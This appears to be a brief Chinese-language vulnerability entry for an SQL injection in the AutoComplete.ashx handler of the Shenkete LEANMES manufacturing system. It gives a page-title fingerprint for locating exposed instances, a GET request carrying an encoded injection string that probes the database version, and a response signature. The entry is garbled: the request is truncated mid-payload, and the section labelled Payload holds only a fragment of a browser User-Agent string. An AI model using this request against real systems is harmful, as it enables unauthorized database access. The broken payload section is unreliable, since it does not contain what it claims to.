# 深科特LEANMES系统AutoComplete存在SQL注入漏洞

深科特LEANMES系统 ｜ SQL注入 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`GET /Handler/AutoComplete.ashx?field=ItemID&source=Basal_Item&likeStr=%25%32%37%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 Microsoft